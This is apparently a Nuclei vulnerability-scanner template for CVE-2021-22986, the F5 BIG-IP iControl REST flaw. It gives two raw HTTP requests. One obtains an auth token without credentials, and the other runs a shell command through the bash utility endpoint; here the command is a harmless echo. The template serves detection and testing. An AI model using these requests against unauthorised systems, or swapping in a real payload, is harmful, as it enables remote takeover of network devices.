id: CVE-2021-22986
info:
  name: F5 BIG-IP iControl REST unauthenticated RCE
  author: rootxharsh,iamnoooob
  severity: critical
  description: The iControl REST interface has an unauthenticated remote command execution vulnerability.
  tags: bigip

http:
  - raw:
      - |
        POST /mgmt/shared/authn/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Authorization: Basic YWRtaW46
        Content-Type: application/json
        Cookie: BIGIPAuthCookie=1234
        Connection: close
        
        {"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}
      - |
        POST /mgmt/tm/util/bash HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        X-F5-Auth-Token: {{token}}
        Content-Type: application/json
        Connection: close
        
        {"command":"run","utilCmdArgs":"echo gogogo"}

    matchers:
      - type: word
        words:
          - "commandResult"
          - "gogogo"
        condition: and